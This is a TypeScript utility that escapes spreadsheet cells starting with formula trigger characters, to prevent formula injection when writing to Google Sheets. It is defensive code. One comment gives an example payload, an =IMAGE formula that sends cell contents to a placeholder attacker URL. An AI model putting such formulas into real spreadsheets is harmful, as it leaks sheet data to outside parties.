export type CellValue = string | number | boolean | null;

// Google Sheets treats a leading "=" as the start of a formula. When a write
// uses valueInputOption=USER_ENTERED the API evaluates that formula
// server-side, inside the sheet. A cell populated from untrusted content (an
// email body, a shared doc, a scrape) can therefore carry
// =IMPORTRANGE(...) / =IMAGE("https://attacker/?x="&A1) and exfiltrate the
// sheet, or =HYPERLINK() to social-engineer whoever reads it. CWE-1236.
//
// OWASP's CSV-injection trigger set is "=", "+", "-", "@", TAB and CR. Only
// *string* cells are escaped: a numeric -5 is data, not a formula, so numbers
// pass through untouched and spreadsheets keep working normally. The leading
// apostrophe is Google Sheets' own "this is text" marker and is not stored as
// part of the value.
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

export function neutralizeFormulaCells(values: CellValue[][]): CellValue[][] {
  return values.map((row) =>
    row.map((cell) =>
      typeof cell === "string" && FORMULA_TRIGGER.test(cell) ? `'${cell}` : cell
    )
  );
}
